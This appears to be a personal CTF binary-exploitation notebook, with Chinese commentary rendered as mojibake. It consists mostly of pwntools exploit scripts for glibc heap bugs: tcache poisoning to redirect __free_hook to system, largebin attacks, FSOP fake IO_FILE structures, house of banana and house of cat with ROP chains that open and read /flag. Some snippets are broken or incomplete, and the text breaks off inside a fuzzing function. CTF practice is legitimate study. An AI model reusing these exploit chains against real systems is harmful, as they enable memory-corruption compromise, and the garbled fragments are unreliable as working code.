p = process("./vuln")
elf = ELF("./vuln")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def add(idx,size):
    sla(">",1)
    sla("Index: ",idx)
    sla("Size: ",size)

def edit(idx,con):
    sla(">",3)
    sla("Index: ",idx)
    p.sendafter("Content: ",con)

def show(idx):
    sla(">",4)
    sla("Index: ",idx)

def dele(idx):
    sla(">",2)
    sla("Index: ",idx)

for i in range(8):
    add(i, 0x90)# 0-7

add(8, 0x20)

for i in range(8):
    dele(i)

show(0)
key = u64(p.recv(5).ljust(8,'\x00'))
lg('key')
heap_base = key<<12
lg('heap_base')

edit(7, 'a')# main_arenaä½åœ°å€ä¸º\x00
show(7)
libc_base = l64() - 0x1e3c61
lg('libc_base')
free_hook = libc_base + libc.sym["__free_hook"]
system_addr = libc_base + libc.sym["system"]
edit(7, '\x00')

#--------------------æ”¹fd----------------------
add(9, 0x20)
add(10, 0x20)# æ”¾binsh
edit(10, "/bin/sh\x00")

dele(8)
dele(9)

edit(9, p64(free_hook ^ key))
add(11, 0x20)
add(12, 0x20)
edit(12, p64(system_addr))

dele(10)
ia()
```



### è¾“å‡ºç‚¹

**%s     æŒ‡é’ˆæˆ–è€…æ•°ç»„(èƒ½å»å¼•ç´¢)**

%d     ä¸å¤Ÿåœ°å€é•¿åº¦çš„æ•°(ä¸èƒ½å¼•ç´¢)

### è¾“å…¥ç‚¹/ä¿®æ”¹ç‚¹

å¸ƒå±€çš„å…³é”®

ä¿®æ”¹æœ¬è´¨å°±æ˜¯ä¸€ç§é“¾å¼å¼•ç´¢

```c
buf[read(0, buf, 0x100uLL)] = 0; //offbynull
```



```c
__int64 __fastcall sub_9F5(_BYTE *a1, int a2)
{
  int i; // [rsp+14h] [rbp-Ch]

  if ( a2 <= 0 )
    return 0LL;
  for ( i = 0; ; ++i )
  {
    if ( read(0, a1, 1uLL) != 1 )
      return 1LL;
    if ( *a1 == '\n' )
      break;
    ++a1;
    if ( i == a2 )
      break;
  }
  *a1 = 0;                                      // offbynull
  return 0LL;
}
```





## IOåˆ©ç”¨

### Linkmapç¨‹åºåŸºåœ°å€

åŠ«æŒLinkmapé“¾è¡¨ä¸­å­˜æ”¾çš„ç¨‹åºåŸºåœ°å€ä¸ºone_gadgetåœ°å€-0x3d70(fini_array_addr)ï¼Œå¯¼è‡´è§¦å‘fini_arrayæ—¶è§¦å‘one_gadget

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
# p = process('./ld-2.33.so ./TinyNote'.split(),env={'LD_PRELOAD':'./libc-2.33.so'})
p = process("./manageheap")
elf = ELF("./manageheap")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
# context.terminal = ['cmd.exe', '/c', 'wt.exe', '-w', '0','--title', 'gdb', 'bash', '-c']
context.terminal = ['tmux', 'splitw', '-hp','60']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def add(size,name,id_con='a'):
    sla("Your Choice:",1)
    sla("please input your major's number:",size)
    p.sendafter("please input your name:",name)
    sa("> \n",id_con)

def show(idx):
    sla("Your Choice:",3)
    sla("input your idx:",idx)

def edit(idx,id_con,new_con):
    sla("Your Choice:",4)
    sla("input your idx:",idx)
    sa("please input your id:",id_con)
    s(new_con)

def dele(idx):
    sla("Your Choice:",2)
    sla("input your idx:",idx)

# æ‹¿åœ°å€
heap_base = uu64()-0x2d0
lg('heap_base')
key = heap_base>>12
lg('key')
libc_base = l64()-0x219c61-0x500
lg('libc_base')
link_map = libc_base + 0x2652e0 # search -p "0x5588228e5000" ï¼Œç„¶åå»çœ‹

pwndbg> tel 0x7f651f76f2c0
00:0000â”‚  0x7f651f76f2c0 â€”â–¸ 0x5588228e5000 â—‚â€” 0x10102464c457f   0x7f651f76f2c0è¿™ä¸ªå°±æ˜¯
01:0008â”‚  0x7f651f76f2c8 â€”â–¸ 0x7f651f76f880 â—‚â€” 0x0    è¿™ä¸ªä½ç½®æ˜¯åå­—ï¼Œç¨‹åºæœ¬èº«å°±æ˜¯ç©º
02:0010â”‚  0x7f651f76f2d0 â€”â–¸ 0x5588228ec000 â—‚â€” 0x1d   è¿™é‡Œéƒ½æ˜¯1d
03:0018â”‚  0x7f651f76f2d8 â€”â–¸ 0x7f651f76f890(è¿™ä¸ªåœ°å€å°±æ˜¯next_loadbananaçš„) â€”â–¸ 0x7ffd2b13a000 â—‚â€” jg 0x7ffd2b13a047
04:0020â”‚  0x7f651f76f2e0 â—‚â€” 0x0
05:0028â”‚  0x7f651f76f2e8 â€”â–¸ 0x7f651f76f2c0 â€”â–¸ 0x5588228e5000 â—‚â€” 0x10102464c457f
06:0030â”‚  0x7f651f76f2f0 â—‚â€” 0x0
07:0038â”‚  0x7f651f76f2f8 â€”â–¸ 0x7f651f76f868 â€”â–¸ 0x7f651f76f880 â—‚â€” 0x0


lg("link_map")
one = libc_base + 0xebcf1

edit(1,p64((heap_base+0xc20)^key),p64(link_map^key))
add(0x49,'a'*0x10)# 5
add(0x49,p64(one)'æ”¾one',p64(heap_base+0x740-0x3D70))# 6

# exit

ia()
```

### mp_.tcache_bins

æ¼æ´ç‚¹ï¼šmp_.tcache_binså¯è¢«å†™ä¸ºä¸€ä¸ªå¤§å€¼

```python
add(size)# è¿™é‡Œsizeè¦>0x430
# å¸ƒç½®ä½ï¼šheap_base + (size>>4 *8)+0x88

add(0, 0x528)
add(1, 0x600)
add(2, 0x518)

dele(0)
add(3,0x900)
show(0)
libc_base = l64()-0x1e4030
main_arena = libc_base+0x1e4030
lg('libc_base')
mp_ = libc_base + 0x1e3280 # p &mp_
free_hook = libc_base + libc.sym["__free_hook"]
system_addr = libc_base + libc.sym["system"]
lg('mp_')

edit(0,'a'*0x10)
show(0)
ru("a"*0x10)
heap_base = uu64()-0x290
lg('heap_base')
key = heap_base>>12
lg('key')

edit(0,p64(main_arena)*2)
dele(2)
pay = p64(main_arena)*2 + p64(0) + p64(mp_+0x50-0x20)
edit(0,pay)
add(3,0x900)
# -------------------------------------------------------------------
# ---Largebinattackå

dele(1)# 0x600
edit(0,"a"*0xe8 + p64(free_hook))

add(1,0x600)
edit(1, p64(system_addr))
edit(0, "/bin/sh\x00")
dele(0)
ia()
```



![image-20220409223332707](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220409223332707.png)

![image-20220403180012397](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220403180012397.png)

`0x0000564ce2ed6000+0x90`

### global_fast

æ¼æ´ç‚¹ï¼šglobal_fastå¯è¢«å†™ä¸ºä¸€ä¸ªå¤§å€¼

åœ¨å¯ä»¥ç”³è¯·0xffffç±»å¤§å †çš„æƒ…å†µä¸‹(**ä»»æ„åœ°å€å†™ä»»æ„å€¼**ï¼Œä»»æ„å€¼è¦æ±‚èƒ½UAF)

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
p = process("./heap2019")
elf = ELF("./heap2019")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','60']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def add(size,con='a'):
    sla("4.exit",1)
    sla("Content length:",size)
    p.sendafter("Content:",con)

def edit(con):
    sla("4.exit",2)
    p.sendafter("Comment:",con)

def dele(idx):
    sla("4.exit",3)
    sla("Content id:",idx)

# æ¼æ´ç‚¹æ˜¯ä»»æ„åœ°å€å†™deadbeef
sla("4.exit",2019)
p.recvuntil("0x")
base = int(p.recv(12),16)-0x202040
lg('base')

add(0x410,'a')# 0
add(0x400,'a')# 1
add(0x420,'a')# 2
add(0x408,'a'*0x400+'/bin/sh\x00')# 3 ä¼ªé€ IO

dele(0)
dele(2)
add(0x2333,'a')# 0
add(0x420,'a')# 2
ru("Data is:\n")
heap_base = uu64()-0x61
lg('heap_base')

add(0x410,'a')# 4
ru("Data is:\n")
libc_base = l64()-0x3c4f00-0x61
lg('libc_base')
system = libc_base + libc.sym['system']
IO_list_all = libc_base + 0x3c5520
lg('IO_list_all')
global_max_fast = libc_base + 0x3c67f8
# ---------------------------------------------
# p &main_arena.fastbinsY
# p &global_max_fast
add(size) 
# delta = IO_list_all/free_hook - main_arena.fastbinsY_addr
# size = (delta * 2) + 0x10
pay = IO_FILE
edit(chunk,pay)
# ä¸€æ®µæ”»å‡»
dele(chunk) # å†™å…¥å †åœ°å€
# äºŒæ®µæ”»å‡»,åˆ©ç”¨UAF
# edit(chunk,p64(system))
# add(chunk)//å†™å…¥system


dele(0)
vtable = heap_base + 0x001150
pay = p64(0)*2
pay += p64(0) + p64(1)
pay = pay.ljust(0xC0,'\x00')
pay += p64(0)+p64(vtable)
# vtable
pay += p64(0)*3
pay += p64(system)
add(0x1400,pay)# 0

edit('a'*0x20+p64(global_max_fast))
dele(0)# IO_list_allå†™å…¥å †åœ°å€

sla("4.exit", '4')
ia()
```



### 2.23 FSOP

```python
system = libc_base + libc.sym['system']

vtable = heap_base + 0x001150
# pay = '/bin/sh\x00'+p64(size)
pay += p64(0)*2 # å¯è¢«ä¿®æ”¹
pay += p64(0) + p64(1)
pay = pay.ljust(0xC0,'\x00')
pay += p64(0)+p64(vtable)
# vtable
pay += p64(0)*3
pay += p64(system)# one_gadget
```

### 2.23 house of orange



![image-20220507104532095](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220507104532095.png)

### 2.27 FSOP

```python
def FILE(binsh,system,IO_str_jumps):
	fake_IO_FILE  = p64(0xfbad1800) + p64(0)*3
	fake_IO_FILE += p64(0) + p64(0xffffffffffffffff) # fp->_IO_write_ptr > fp->_IO_write_base; pos >= (_IO_size_t) (_IO_blen (fp) + flush_only)
	fake_IO_FILE += p64(0)*2 + p64((binsh-100)//2)
	fake_IO_FILE = fake_IO_FILE.ljust(0xC0,'\x00')
	fake_IO_FILE += p64(0) + p64(0)*2	# _mode <= 0
	fake_IO_FILE += p64(IO_str_jumps)
	fake_IO_FILE += p64(system) # 0xe0 
	return fake_IO_FILE

```

### 2.36 FSOP/CAT

åªéœ€ä¿®æ”¹**fake_io_addr**åœ°å€ï¼Œ**\_IO_save_end**ä¸ºæƒ³è¦è°ƒç”¨çš„å‡½æ•°ï¼Œ**\_IO_backup_base**ä¸ºæ‰§è¡Œå‡½æ•°æ—¶çš„rdxï¼Œä»¥åŠä¿®æ”¹_flagsä¸ºæ‰§è¡Œå‡½æ•°æ—¶çš„rdi;

![å›¾ç‰‡æè¿°](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/959842_JDJKTRK7GJUEUFR.png)

```python
setcontext = libc_base + libc.sym['setcontext'] + 61
IO_wfile_jumps = libc_base + 0x1f30a0
one_gadget = libc_base + 0x105fb7

heap_base = libc_base-0x034000 # heap_base
fake_io_addr = heap_base+0x10 # IO_list_allæ”¾çš„åœ°å€

next_chain = 0
fake_IO_FILE  = p64(0xfbad1800) + p64(0) # _flag = '/bin/sh'/rdi
fake_IO_FILE += p64(0)*2
fake_IO_FILE += p64(0)+p64(0xffffffffffffffff)
fake_IO_FILE += p64(0)+p64(0)
fake_IO_FILE += p64(1)+p64(2)
fake_IO_FILE += p64(fake_io_addr+0xb0) # _IO_backup_base = setcontext_rdx/rdx
fake_IO_FILE += p64(one_gadget) # _IO_save_end = call addr(call setcontext)
fake_IO_FILE =  fake_IO_FILE.ljust(0x68, '\x00')
fake_IO_FILE += p64(0) # _chain
fake_IO_FILE =  fake_IO_FILE.ljust(0x88, '\x00')
fake_IO_FILE += p64(heap_base) # _lock = a writable address
fake_IO_FILE =  fake_IO_FILE.ljust(0xa0, '\x00')
fake_IO_FILE += p64(fake_io_addr+0x30) #_wide_data,rax1_addr
fake_IO_FILE =  fake_IO_FILE.ljust(0xc0, '\x00')
fake_IO_FILE += p64(1) 
fake_IO_FILE =  fake_IO_FILE.ljust(0xd8, '\x00')
fake_IO_FILE += p64(IO_wfile_jumps+0x30)  # vtable
fake_IO_FILE += p64(0)*6
fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr

sl(fake_IO_FILE)
# sl(fake_IO_FILE[0x10:])

```



### house of bananaï¼ˆ2.37ä»¥ä¸Šæœ‰ä¸åŒï¼‰

__æ‰¾åœ°å€å‚ç…§<Linkmapç¨‹åºåŸºåœ°å€>__

__è¿™æ¡é“¾è¿˜ä¼šæ ¡éªŒå†™åœ¨rtld_globalä¸Šå †åœ°å€ + 0x3e0çš„ä½ç½®ï¼Œæ‰€ä»¥è¦ä¿æŒå¤§èŒƒå›´çš„æ¸…æ´ï¼Œé€‰æ‹©æ”¾ç½®IOç»“æ„ä½“çš„ä½ç½®è¦è°¨æ…__

__rtld_globalä¸Šå†™çš„å †åœ°å€æ˜¯headå¤´__

__æ³¨æ„ï¼Œè¦ä¼ªé€ headå¤´fake_heap_addr + 0x20__
__æ³¨æ„ï¼Œç»“æ„ä½“å¤§å°0x334æ˜¯ç›¸å¯¹äºrtld_globalä¸Šå †åœ°å€+0x10çš„ï¼Œæ³¨æ„å˜æ¢å¤§å°__


```c
exit-> __run_exit_handlers->_dl_fini->_dl_fini+520(setcontext)

è¿›  _dl_fini
2.36ä»¥ä¸Šæ˜¯call rax   å¯å‚è€ƒ /mnt/hgfs/ctf/hgame/without_hook
2.30æ˜¯call rdx

```



```python
# UAF
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("week-4.hgame.lwsec.cn","31435")
p = process("./vuln")
elf = ELF("./vuln")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def add(idx,size):
    sla(">",1)
    sla("Index: ",idx)
    sla("Size: ",size)

def edit(idx,con):
    sla(">",3)
    sla("Index: ",idx)
    p.sendafter("Content: ",con)

def show(idx):
    sla(">",4)
    sla("Index: ",idx)

def dele(idx):
    sla(">",2)
    sla("Index: ",idx)

add(0,0x520)# big
add(1,0x508)
add(2,0x508)# small IO_FILE

dele(0)
add(3,0x900)
show(0)
libc_base = l64()-0x1f70f0
main_arena = libc_base + 0x1f70f0
lg('libc_base')
rtld_global = libc_base+0x23d020
lg('rtld_global')
setcontext = libc_base + libc.sym['setcontext'] + 61
ret = libc_base + libc.sym['setcontext'] + 0x14E
lg('ret')
pop_rdi = libc_base + 0x0000000000023ba5

pop_rsi = libc_base + 0x00000000000251fe
pop_rdx = libc_base + 0x000000000008bbb9 # pop_2
Open=libc_base+libc.sym['open']
Read=libc_base+libc.sym['read']
Write=libc_base+libc.sym['write']
# bin_sh = libc_base + libc.search('/bin/sh\x00').next()
# system =  libc_base + libc.sym['system']
# lg("system")

edit(0,'a'*0x10)
show(0)
ru("a"*0x10)
heap_base = uu64()-0x290
lg('heap_base')
key = heap_base>>12
lg('key')

edit(0,p64(main_arena)*2)
dele(2)
edit(0,p64(main_arena)*2 + p64(0) + p64(rtld_global-0x20))
add(3,0x900)
# -------------------------------------------------------------------

setcontext = libc_base + libc.sym['setcontext'] + 61
ret = libc_base + libc.sym['setcontext'] + 0x14E
pop_rdi = libc_base + 0x0000000000023ba5
bin_sh = libc_base + libc.search('/bin/sh\x00').next()
system =  libc_base + libc.sym['system']
lg('ret')

fake_heap_addr = heap_base+0xcd0 # rtld_globalå¡«çš„å †åœ°å€
# flag_addr = fake_heap_addr+0xb8 # ç›¸å¯¹åç§»
next_load = libc_base + 0x23e8b0 # ç¬¬ä¸€ä¸ªload+0x18çš„å€¼

orw =  p64(pop_rsi)+p64(0)+p64(Open)
orw += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_base+0x1b00)+p64(pop_rdx)+p64(0x50)+p64(0)+p64(Read)
orw += p64(pop_rdi)+p64(1)+p64(Write)+"/flag".ljust(8,'\x00')

payload = p64(0) + p64(next_load) + p64(0) + p64(fake_heap_addr)
payload += p64(setcontext) + p64(ret) # rdx_addr/call rdx

payload += p64(flag_addr) # rsp
payload += orw # 0x78
payload = payload.ljust(0xc8,'\x00')
# payload += p64(bin_sh)# rsp
# payload += p64(0)
# payload += p64(system)
# payload += '\x00'*0x80

payload += p64(fake_heap_addr + 0x28 + 0x18) # rdx+0xa0
payload += p64(pop_rdi) # rdx+0xa8
payload = payload.ljust(0x100,'\x00')
payload += p64(fake_heap_addr + 0x10 + 0x110)*0x3
payload += p64(0x10)
payload = payload.ljust(0x334 - 0x10,'\x00')# 2.36
payload += '\x10'
# payload = payload.ljust(0x31C - 0x10,'\x00')
# payload += '\x08'

edit(2,payload)
edit(1,'a'*0x500+p64(fake_heap_addr + 0x20))

sla(">",5)
ia()
```


```python
fake_heap_addr = heap_base + 0xbf0# rtl_globalå¡«çš„åœ°å€ä¸€èˆ¬æŒ‡å‘å †çš„headå¤´
next_load = libc_base + xxx

payload  = p64(0) + p64(next_load)
payload += p64(0) + p64(fake_heap_addr)
payload += p64(libc_base+0x0000000000157c3a) + p64(ret)
# 0x0000000000157c3a : mov rdx, rbp ; mov rdi, r13 ; call qword ptr [rax + 0x20]
# payload += p64(bin_sh) + p64(ret)
# payload += p64(system) + p64(setcontext)
# payload += p64(0) + p64(0)
# payload += p64(0) + p64(0)
# payload += p64(0) + p64(0)
# payload += p64(0) + p64(0)

payload += p64(heap_base) + p64(ret)
payload += p64(pop_rsi) + p64(setcontext)
payload += p64(pop_rsi) + p64(0x10000)
payload += p64(pop_rdx) + p64(7)
payload += p64(mprotect) + p64(heap_base+0x001550)# shellcode_addr
payload += p64(0) + p64(0)

payload += p64(fake_heap_addr + 0x28 + 0x18)# 0xa0 rsp
payload += p64(pop_rdi)# 0xa8 rcx
payload = payload.ljust(0x100,'\x00')
payload += p64(fake_heap_addr + 0x10 + 0x110)*0x3
payload += p64(0x10)
payload = payload.ljust(0x334 - 0x10,'\x00')
payload += '\x10'

edit(2,payload)
edit(1,'a'*0x420 + p64(fake_heap_addr + 0x20))# call setcontext 
# dbg('b _dl_call_fini\nc\n')

sla('>>','5')
sla('name:','e4l4')
```



### house of cat 

```c
__malloc_assert->__fxprintf->locked_vfxprintf->__vfprintf_interna->__vfprintf_internal
->_IO_wfile_seekoff->_IO_switch_to_wget_mode(_IO_WOVERFLOW)
```





````python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
p = process("./house_of_cat")
elf = ELF("./house_of_cat")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def login():
    sa("mew mew mew~~~~~~",'LOGIN | r00t QWB QWXFadmin')

def game():
    sa("mew mew mew~~~~~~",'CAT | r00t QWB QWXF'+'\xff'+'$')

def add(idx,size,con='a'):
    game()
    sla("plz input your cat choice:",1)
    sla("plz input your cat idx:",idx)
    sla("plz input your cat size:",size)
    p.sendafter("plz input your content:",con)

def dele(idx):
    game()
    sla("plz input your cat choice:",2)
    sla("plz input your cat idx:",idx)

def show(idx):
    game()
    sla("plz input your cat choice:",3)
    sla("plz input your cat idx:",idx)

def edit(idx,con):
    game()
    sla("plz input your cat choice:",4)
    sla("plz input your cat idx:",idx)
    p.sendafter("plz input your content:",con)


login()
add(0,0x420)
add(1,0x418)
add(2,0x418)

dele(0)
add(3,0x430)
show(0)
libc_base = l64()-0x21A0D0
lg('libc_base')
main_arena = libc_base+0x21A0D0
p.recv(10)
heap_base=u64(p.recv(6).ljust(8,'\x00'))-0x290
lg('heap_base')
#---------------------------------------------------------
setcontext = libc_base + libc.sym['setcontext'] + 61 
# Close = libc_base + libc.sym['close']
# Open = libc_base + libc.sym["open"]
Read = libc_base + libc.sym["read"]
Write = libc_base + libc.sym['write']
stderr = libc_base + libc.sym['stderr'] # *
IO_wfile_jumps = libc_base + 0x2160c0 # *
lg('IO_wfile_jumps')
pop_rdi = libc_base + 0x000000000002a3e5
pop_rsi = libc_base + 0x000000000002be51
pop_rdx_rbx = libc_base + 0x0000000000090529 
pop_rax = libc_base + 0x0000000000045eb0
syscall = libc_base + 0x0000000000091396
ret= libc_base + 0x0000000000029cd6


orw_addr = heap_base+0x17b0
fake_io_addr = heap_base+0xae0  # ä¼ªé€ çš„fake_IOç»“æ„ä½“çš„åœ°å€
flag = fake_io_addr+0x160

next_chain = 0
fake_IO_FILE  = p64(0xfbad1800) + p64(0) # _flag = '/bin/sh'/rdi
fake_IO_FILE += p64(0)*6
fake_IO_FILE += p64(1)+p64(2)
fake_IO_FILE += p64(fake_io_addr+0xb0) # _IO_backup_base = setcontext_rdx/rdx
fake_IO_FILE += p64(setcontext) # _IO_save_end = call addr(call setcontext)
fake_IO_FILE =  fake_IO_FILE.ljust(0x68, '\x00')
fake_IO_FILE += p64(0) # _chain
fake_IO_FILE =  fake_IO_FILE.ljust(0x88, '\x00')
fake_IO_FILE += p64(heap_base) # _lock = a writable address
fake_IO_FILE =  fake_IO_FILE.ljust(0xa0, '\x00')
fake_IO_FILE += p64(fake_io_addr+0x30) #_wide_data,rax1_addr
fake_IO_FILE =  fake_IO_FILE.ljust(0xc0, '\x00')
fake_IO_FILE += p64(1) # _mode = 1
fake_IO_FILE =  fake_IO_FILE.ljust(0xd8, '\x00')
fake_IO_FILE += p64(IO_wfile_jumps+0x10)  # vtable
fake_IO_FILE += p64(0)*6
fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr

fake_IO_FILE =  fake_IO_FILE.ljust(0x150,'\x00')
fake_IO_FILE += p64(orw_addr)+p64(ret)# fake_io_addr+0xb0+0xa0/0xa8
fake_IO_FILE += '/flag'.ljust(0x10, '\x00')

dele(2)# å› ä¸ºé¢˜ç›®åªèƒ½edit 0x30/æ‰€ä»¥è¦é‡æ–°ç”³è¯·
add(5,0x418,fake_IO_FILE[0x10:])

dele(2)
edit(0,p64(main_arena)*2+p64(0)+p64(stderr-0x20))
add(4,0x450)
#----------------------------------------------
# orw =  p64(pop_rdi)+p64(0)+p64(Close)# é™åˆ¶äº†readçš„fdä¸º0
# orw += p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)+p64(Open)
orw += p64(pop_rax)+p64(2)+p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)+p64(syscall)
orw += p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(fake_io_addr+0x200)+p64(pop_rdx_rbx)+p64(0x30)+p64(0)+p64(Read)
orw += p64(pop_rdi)+p64(1)+p64(Write)
add(6,0x450,orw)

# Largebinattackæ”¹topchunkä½ä¸ºå°å€¼
add(7,0x440)
add(8,0x430)
add(9,0x430)
dele(7)
add(10,0x450)
dele(9)
edit(7,p64(libc_base+0x21a0e0)*2+p64(0)+p64(heap_base+0x2d30+3-0x20))
game()
sla("plz input your cat choice:",1)
sla("plz input your cat idx:",15)
sla("plz input your cat size:",0x468)# Largebinattack å’Œ __malloc_assert

p.interactive()
````


## Fuzz with CTFğŸƒ

w: æ¸…ç©ºåè¦†å†™ï¼Œæ²¡æœ‰å…ˆåˆ›å»º
a: è¿½åŠ ï¼Œæ²¡æœ‰å…ˆåˆ›å»º
r: ä¸æ¸…ç©ºè¦†å†™ï¼Œæ²¡æœ‰ä¼šæŠ¥é”™
æ‰€æœ‰åè¾¹å¤šä¸€ä¸ª+ï¼Œéƒ½æ˜¯åŒæ—¶è¯»å†™

```python
def fuzz():
    f=open('./log.txt','w')
    for i in range(0x1000):
        if(i%10==0):
            a = randint(0,8)
            b = randint(0,8)
            add(a,b,str(i))
            data0=r.recvuntil('Choice Table')
            if 'two many' in data0:
                break
            f.write(' add({},{},str({}))\n'.format(a,b,i))
        elif(i%2==0):
            a = randint(0,8)
            b = randint(0,8)
            delet(a,b)
            data0=r.recvline()
            if 'not exists' in data0:
                continue
